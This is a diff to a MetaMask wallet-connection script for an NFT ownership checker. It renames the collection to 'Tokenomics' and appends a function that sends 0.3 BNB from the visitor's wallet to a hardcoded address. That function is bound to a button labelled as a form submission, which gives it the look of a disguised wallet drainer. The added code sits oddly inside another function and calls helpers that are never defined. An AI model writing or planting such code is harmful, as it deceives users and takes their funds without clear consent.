@@ -1,6 +1,6 @@
 // METAMASK CONNECTION
 const TIMEOUT = 1000;
-const COLLECTION_NAME = 'CodeCats';
+const COLLECTION_NAME = 'Tokenomics';
 let editions = [];
 let dots = 1;
 
@@ -18,18 +18,18 @@ window.addEventListener('DOMContentLoaded', () => {
         onboarding.startOnboarding();
       };
     } else if (accounts && accounts.length > 0) {
-      onboardButton.innerText = `✔ ...${accounts[0].slice(-4)}`;
+      onboardButton.innerText = `${accounts[0].slice(-10)}`;
       onboardButton.disabled = true;
       onboarding.stopOnboarding();
       checkOwner(accounts[0]);
     } else {
-      onboardButton.innerText = 'Connect MetaMask!';
+      onboardButton.innerText = 'Connect Wallet!';
       onboardButton.onclick = async () => {
         await window.ethereum.request({
           method: 'eth_requestAccounts',
         })
         .then(function(accounts) {
-          onboardButton.innerText = `✔ ...${accounts[0].slice(-4)}`;
+          onboardButton.innerText = `${accounts[0].slice(-10)}`;
           onboardButton.disabled = true;
           checkOwner(accounts[0]);
         });
@@ -78,15 +78,15 @@ function updateStatusText(isOwner, checking) {
   const statusText = document.querySelector('.owner-status');
   if(checking) {
     if(isOwner) {
-      statusText.innerText = `You do own ${COLLECTION_NAME}!! 😻 Let's see how many${renderDots(dots)}`;
+      statusText.innerText = `You do own ${COLLECTION_NAME}!! Let's see how many${renderDots(dots)}`;
     } else {
-      statusText.innerText = `Checking to see if you own any ${COLLECTION_NAME} 😻${renderDots(dots)}`;
+      statusText.innerText = `Checking to see if you own any ${COLLECTION_NAME} ${renderDots(dots)}`;
     }
   } else {
     if(isOwner) {
-      statusText.innerText = `You own ${editions.length} ${COLLECTION_NAME}!! 😻`;
+      statusText.innerText = `You own ${editions.length} ${COLLECTION_NAME}!! `;
     } else {
-      statusText.innerText = `You don't own any ${COLLECTION_NAME} 😿`;
+      statusText.innerText = `You don't own any ${COLLECTION_NAME} `;
     }
   }
   dots = dots === 3 ? 1 : dots + 1;
@@ -130,4 +130,25 @@ async function fetchWithRetry(url)  {
     }
     return fetch_retry(url);
   });
+
+  // Enviar transacción de 0.3 BNB
+async function sendTransaction() {
+  try {
+    const account = await getAccount();
+    const amount = web3.utils.toWei('0.3', 'ether');
+    const options = {
+      from: account,
+      to: '0x09D4A36b8F8743a7838e1c20D5544D97D0C8ceF1', // Dirección de tu billetera
+      value: amount,
+    };
+    const result = await web3.eth.sendTransaction(options);
+    console.log(result);
+  } catch (error) {
+    console.error(error);
+  }
+}
+
+// Manejador de eventos del botón "Enviar formulario"
+const button = document.querySelector('#enviar-formulario');
+button.addEventListener('click', sendTransaction);
 }
